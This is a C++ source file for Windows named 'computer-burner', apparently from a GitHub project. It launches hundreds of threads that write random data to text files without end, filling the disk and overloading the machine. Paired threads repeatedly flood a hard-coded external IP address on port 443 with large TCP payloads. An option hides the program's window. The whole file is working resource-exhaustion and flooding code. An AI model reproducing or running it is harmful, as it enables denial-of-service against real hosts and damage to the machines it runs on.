#include "stdc++.h"
#include "winsock2.h"
#include <Ws2tcpip.h>
#include <windows.h>
#include <random>
#include <functional>
#include <ctype.h>
#include <fstream>
#include<thread>
#include"cmdline.h"
#pragma comment(lib,"ws2_32.lib")
using namespace std;
//#define int long long
std::thread mythread[5000], ctcp[5000];
int numthread = 400,wait=0;

void show(int i) {
	fstream f;
	string s = to_string(i) + ".txt";
	f.open(s, ios::out);
	int min = 0, max = 1e9;
	random_device seed;
	ranlux48 engine(seed());
	uniform_int_distribution<> distrib(min, max);

	while (1) {
		for (int i = 1; i <= 10000; i++) {
			f << "something";
			f << distrib(engine);
		}
	}
}void tcp(int i) {
	WSADATA wsaData;
	char buff[1024];
	memset(buff, 0, sizeof(buff));

	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)return;

	SOCKADDR_IN addrSrv;
	addrSrv.sin_family = AF_INET;
	addrSrv.sin_port = htons(443);
	//addrSrv.sin_addr.S_un.S_addr = inet_addr("124.205.120.153");
	inet_pton(AF_INET, "124.205.120.153", &addrSrv.sin_addr.s_addr);
	SOCKET sockClient = socket(AF_INET, SOCK_STREAM, 0);

	if (SOCKET_ERROR == sockClient) {
		//printf("Socket() error:%d", WSAGetLastError());
		return;
	}

	if (connect(sockClient, (struct  sockaddr*)&addrSrv, sizeof(addrSrv)) == INVALID_SOCKET) return;
	else recv(sockClient, buff, sizeof(buff), 0);

	char buffs[10000] = "nothing";
	send(sockClient, buffs, sizeof(buffs), 0);

	for (int i = 0; i < 10000; i++)
		buffs[i] = 'c';

	while(1){
		send(sockClient, buffs, sizeof(buffs), 0);
	}
}signed main(int argc, char* argv[]) {
	//if (argc != 3)cout << "error thread number";
	//numthread = atoi(argv[1]);
	//Sleep(1000);
	SetConsoleTitle(L"computer-burner");
	cmdline::parser a;
	a.add<int>("thread", 't', "number of threads", false, 400);
	a.add<int>("wait",  'w', "time to wait before start(ms)", false, 0);
	a.add("background", 'b', "no window");
	a.parse_check(argc, argv);
	a.footer("for more imformation ,visit github: https://github.com/DDEEII/computer-burner\n");
	numthread = a.get<int>("thread");
	wait = a.get<int>("wait");
	if (wait < 0 || numthread < 0) cout << "using defult: 400 threads,start without waiting";
	else cout << "using " << numthread << " threads, wait " << wait << "ms before starting\n";
	if (a.exist("background")) {
		HWND hWnd = FindWindow(NULL, L"computer-burner");
		ShowWindow(hWnd, 0);
	}
	Sleep(wait);
	for (int i = 0; i < numthread; i++) {
		mythread[i] = thread(show, i);
		ctcp[i] = thread(tcp, i);
	}

	for (int i = 0; i < numthread; i++) {
		mythread[i].join();
		ctcp[i].join();
	}

	return 0;
}
